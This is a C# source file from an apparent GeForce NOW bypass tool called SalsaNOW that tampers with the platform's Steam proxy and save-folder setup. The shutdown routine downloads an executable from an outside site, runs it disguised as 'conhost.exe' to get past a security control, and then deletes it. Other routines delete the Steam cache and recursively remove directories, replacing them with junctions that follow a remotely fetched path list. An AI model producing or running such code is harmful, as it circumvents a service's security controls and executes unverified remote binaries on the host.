using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace SalsaNOW
{
    internal static class SteamManager
    {
        // Steam Server (NVIDIA Made Proxy Interceptor for Steam) "127.10.0.231:9753"
        // Steam Server communicates with Steam by proxy and intercepts function calls from Steam by
        // making them not happen or replaces them with special made ones to do something else.
        // Shutting the server down by POST request will lead to all opted-in games on
        // GeForce NOW to show up on Steam.
        
        public static async Task ShutdownServerAsync(string globalDirectory)
        {
            try
            {
                SalsaLogger.Info("Initiating Steam Proxy shutdown sequence...");
                string dummyJson = Path.Combine(globalDirectory, "kaka.json");
                string usgMask = Path.Combine(globalDirectory, "conhost.exe");

                using (var wc = new WebClient())
                {
                    try { await wc.UploadStringTaskAsync("http://127.10.0.231:9753/shutdown", "POST"); } catch { }
                    await wc.DownloadFileTaskAsync(new Uri("https://salsanowfiles.work/jsons/kaka.json"), dummyJson);
                }

                // Force lockdown server to use our fake JSON definition
                Process.Start(new ProcessStartInfo
                {
                    FileName = @"C:\Program Files (x86)\Steam\lockdown\server\server.exe",
                    Arguments = dummyJson,
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                });

                string cache = @"C:\Program Files (x86)\Steam\appcache";
                if (Directory.Exists(cache)) Directory.Delete(cache, true);

                // Steam USG Bypass Part (Temporary until patch discovered)
                using (var wc = new WebClient()) await wc.DownloadFileTaskAsync(new Uri("https://salsanowfiles.work/USG/bleh.exe"), usgMask);
                var usg = Process.Start(usgMask);
                if (usg != null) { while (!usg.HasExited) await Task.Delay(1000); }
                await Task.Delay(200);
                if (File.Exists(usgMask)) File.Delete(usgMask);
                
                SalsaLogger.Info("Steam Proxy successfully bypassed.");
            }
            catch (Exception ex) { SalsaLogger.Error($"Steam Proxy Shutdown Error: {ex.Message}"); }
        }

        // Sets up directory junctions for cloud saves redirection
        public static async Task SetupGameSavesAsync(string globalDirectory)
        {
            try
            {
                SalsaLogger.Info("Setting up Cloud Save directory junctions...");
                string json;
                using (var wc = new WebClient()) json = await wc.DownloadStringTaskAsync("https://salsanowfiles.work/jsons/GameSavesPaths.json");
                var savePaths = JsonConvert.DeserializeObject<GamesSavePaths>(json);
                string savesRoot = Path.Combine(globalDirectory, "Game Saves");
                Directory.CreateDirectory(savesRoot);

                foreach (var dir in savePaths.paths)
                {
                    string crafted = Path.Combine(savesRoot, Path.GetFileName(dir));
                    Directory.CreateDirectory(crafted);
                    Process.Start(new ProcessStartInfo("cmd.exe", $"/c rmdir /s /q \"{dir}\"") { UseShellExecute = true });
                    await Task.Delay(500);
                    Process.Start(new ProcessStartInfo("cmd.exe", $"/c mklink /J \"{dir}\" \"{crafted}\"") { UseShellExecute = true });

                    if (dir.Contains(@"C:\Users\Public\Documents")) await HandlePublicDocs(dir, crafted);
                }
                SalsaLogger.Info("Cloud Save junctions successfully created.");
            }
            catch (Exception ex) { SalsaLogger.Error($"Game Saves Setup Error: {ex.Message}"); }
        }

        private static async Task HandlePublicDocs(string dir, string crafted)
        {
            // Kill NvContainerWindowClass to release the lock on Public Documents
            foreach (var p in Process.GetProcessesByName("NVDisplay.Container"))
            {
                NativeMethods.EnumWindows((hWnd, lp) => {
                    NativeMethods.GetWindowThreadProcessId(hWnd, out uint pid);
                    if (pid == p.Id) {
                        var sb = new StringBuilder(256);
                        NativeMethods.GetClassName(hWnd, sb, sb.Capacity);
                        if (sb.ToString().StartsWith("NvContainerWindowClass", StringComparison.OrdinalIgnoreCase))
                            NativeMethods.PostMessage(hWnd, (uint)NativeMethods.WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                    }
                    return true;
                }, IntPtr.Zero);
            }
            // Retry loop to ensure junction is created once the process releases the handle
            for (int i = 0; i < 20; i++)
            {
                try { if (Directory.Exists(dir)) Directory.Delete(dir, true);
                    if (!Directory.Exists(dir)) { Process.Start(new ProcessStartInfo("cmd.exe", $"/c mklink /J \"{dir}\" \"{crafted}\"") { UseShellExecute = true }); break; }
                } catch { }
                await Task.Delay(200);
            }
        }
    }
}